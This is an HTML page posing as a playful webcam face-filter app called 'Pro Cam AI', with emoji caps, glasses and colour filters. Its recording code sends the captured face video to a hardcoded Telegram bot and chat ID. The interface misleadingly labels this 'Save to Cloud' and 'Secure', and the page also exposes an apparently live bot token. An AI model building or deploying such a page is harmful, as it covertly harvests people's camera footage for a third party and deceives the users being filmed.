<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Cam AI | Ultimate Edition</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0b0b0f; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; color: #fff; overflow: hidden; }

        .card { background: #16161e; width: 95%; max-width: 440px; padding: 25px; border-radius: 40px; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.03); }

        h1 { font-size: 1.8rem; margin-bottom: 5px; background: linear-gradient(to right, #4d69ff, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p { color: #71717a; font-size: 0.8rem; margin-bottom: 20px; }

        /* Camera Box */
        .video-container { width: 100%; aspect-ratio: 1/1; background: #000; border-radius: 30px; margin-bottom: 20px; position: relative; overflow: hidden; border: 2px solid #3d5afe; box-shadow: 0 0 30px rgba(61, 90, 254, 0.2); }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; transform: scaleX(-1); }
        video { display: none; }

        /* Filter Slider */
        .filter-shelf { display: flex; overflow-x: auto; gap: 12px; padding: 10px 0; margin-bottom: 25px; scrollbar-width: none; }
        .filter-shelf::-webkit-scrollbar { display: none; }
        .filter-item { min-width: 75px; height: 75px; border-radius: 50%; border: 2px solid #27272a; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #1f1f29; font-size: 11px; transition: 0.3s; }
        .filter-item.active { border-color: #4d69ff; background: #3d5afe; transform: scale(1.1); box-shadow: 0 0 15px rgba(61, 90, 254, 0.4); }

        /* Controls */
        .btn { border: none; padding: 18px; border-radius: 50px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.3s; font-size: 1rem; letter-spacing: 1px; }
        .btn-start { background: linear-gradient(135deg, #4d69ff, #3d5afe); color: white; box-shadow: 0 10px 20px rgba(61, 90, 254, 0.3); }
        .btn-record { background: #ef4444; color: white; display: none; box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3); }
        .recording { background: #991b1b !important; animation: pulse 1.5s infinite; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="card">
        <h1>Pro Cam AI</h1>
        <p id="statusText">Secure AI Face Tracking Ready</p>

        <div class="video-container">
            <video id="input_video"></video>
            <canvas id="output_canvas"></canvas>
        </div>

        <div class="filter-shelf">
            <div class="filter-item active" onclick="setFilter('none', this)">Normal</div>
            <div class="filter-item" onclick="setFilter('cap', this)">🧢 Cap</div>
            <div class="filter-item" onclick="setFilter('glasses', this)">🕶️ Glasses</div>
            <div class="filter-item" onclick="setFilter('sepia', this)">Retro</div>
            <div class="filter-item" onclick="setFilter('grayscale', this)">B&W</div>
            <div class="filter-item" onclick="setFilter('neon', this)">Neon</div>
        </div>

        <button class="btn btn-start" id="startBtn">Launch Camera</button>
        <button class="btn btn-record" id="recordBtn">Start Recording</button>
    </div>

    <script>
        // --- YOUR CONFIGURATION ---
        const TG_TOKEN = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
        const TG_CHAT_ID = "7107389141";
        // -------------------------

        const videoElement = document.getElementById('input_video');
        const canvasElement = document.getElementById('output_canvas');
        const canvasCtx = canvasElement.getContext('2d');
        const recordBtn = document.getElementById('recordBtn');
        const statusText = document.getElementById('statusText');
        
        let currentFilter = 'none', mediaRecorder, recordedChunks = [];

        function setFilter(f, el) {
            currentFilter = f;
            document.querySelectorAll('.filter-item').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
        }

        function onResults(results) {
            canvasCtx.save();
            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
            
            // Apply Visual Filters
            if(currentFilter === 'sepia') canvasCtx.filter = 'sepia(1)';
            else if(currentFilter === 'grayscale') canvasCtx.filter = 'grayscale(1)';
            else if(currentFilter === 'neon') canvasCtx.filter = 'hue-rotate(90deg) brightness(1.5)';
            else canvasCtx.filter = 'none';

            canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
            canvasCtx.filter = 'none';

            // Draw AI Accessories
            if (results.multiFaceLandmarks) {
                for (const landmarks of results.multiFaceLandmarks) {
                    const head = landmarks[10], nose = landmarks[168];
                    canvasCtx.font = "110px Arial";
                    if (currentFilter === 'cap') canvasCtx.fillText("🧢", head.x * canvasElement.width - 55, head.y * canvasElement.height + 15);
                    if (currentFilter === 'glasses') canvasCtx.fillText("🕶️", nose.x * canvasElement.width - 50, nose.y * canvasElement.height + 30);
                }
            }
            canvasCtx.restore();
        }

        const faceMesh = new FaceMesh({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`});
        faceMesh.onResults(onResults);
        const camera = new Camera(videoElement, { onFrame: async () => await faceMesh.send({image: videoElement}), width: 640, height: 640 });

        document.getElementById('startBtn').onclick = () => {
            camera.start();
            document.getElementById('startBtn').style.display = 'none';
            recordBtn.style.display = 'block';
            canvasElement.width = 640; canvasElement.height = 640;
            statusText.innerText = "System Active - Tracking Face";
        };

        recordBtn.onclick = () => {
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
                recordBtn.innerText = "Processing & Syncing...";
                recordBtn.disabled = true;
            } else {
                recordedChunks = [];
                const stream = canvasElement.captureStream(30);
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
                mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
                mediaRecorder.onstop = sendToTelegram;
                mediaRecorder.start();
                recordBtn.innerText = "Stop & Save to Cloud";
                recordBtn.classList.add('recording');
                statusText.innerText = "Recording Live Feed...";
            }
        };

        async function sendToTelegram() {
            const blob = new Blob(recordedChunks, { type: 'video/mp4' });
            const formData = new FormData();
            formData.append("chat_id", TG_CHAT_ID);
            formData.append("video", blob, "pro_ai_capture.mp4");
            formData.append("caption", "New AI Capture Received ✅\nFilter: " + currentFilter.toUpperCase());

            try {
                const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                if(res.ok) {
                    statusText.innerText = "Synced to Telegram Successfully!";
                    setTimeout(() => location.reload(), 2000);
                }
            } catch (err) {
                statusText.innerText = "Network Error. Video Saved Locally.";
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob); a.download = 'capture.mp4'; a.click();
            }
        }
    </script>
</body>
</html>
